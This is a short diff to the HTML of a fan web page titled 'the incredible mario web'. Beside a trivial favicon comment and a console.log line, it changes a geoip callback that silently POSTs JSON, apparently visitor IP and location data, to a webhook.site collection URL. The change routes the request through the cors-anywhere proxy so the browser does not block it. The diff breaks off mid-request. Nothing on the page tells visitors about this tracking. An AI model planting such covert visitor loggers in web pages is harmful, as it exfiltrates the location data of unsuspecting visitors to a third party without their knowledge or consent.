@@ -3,6 +3,7 @@
 <title>the incredible mario web</title>
 <meta name="viewport" content="width=device-width initial-scale=1">
 
+<!-- Favicon for the website -->
 <link rel="icon" href="cool.png" type="image/png" />
 
 <style>
@@ -78,7 +79,9 @@ h1 img { height: 1.5em; margin-right: 10px; }
 
 <script>
   function geoip(json) {
-    fetch("https://webhook.site/6b3f8f6f-7fa9-45bc-894f-fbf3c4dc412e", {
+    console.log(json);
+
+    fetch("https://cors-anywhere.herokuapp.com/https://webhook.site/6b3f8f6f-7fa9-45bc-894f-fbf3c4dc412e", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
